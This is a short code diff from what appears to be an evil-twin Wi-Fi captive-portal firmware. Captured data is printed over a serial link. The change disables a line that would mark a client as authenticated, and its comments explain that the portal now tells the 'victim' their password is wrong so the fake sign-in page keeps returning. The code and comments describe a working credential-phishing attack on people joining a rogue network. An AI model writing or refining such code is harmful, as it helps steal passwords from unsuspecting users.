@@ -1725,7 +1725,12 @@ void loop() {
                 if (datos.length() > 0) {
                   Serial1.print("EV:");
                   Serial1.println(datos);
-                  ip_mark_authed(cip);   // creds captured -> clear this client's no-internet warning
+                  // Portal pages now loop the victim ("wrong password"), so we keep the
+                  // network captive and never validate (no 204) -> the sign-in keeps
+                  // coming back. Re-enable the line below to instead clear the OS
+                  // "no internet" warning after a capture (that also makes the
+                  // handle204()/authed_ips path live again):
+                  // ip_mark_authed(cip);   // <- 204 path: mark this client authed after creds
                 }
               }
           }else{
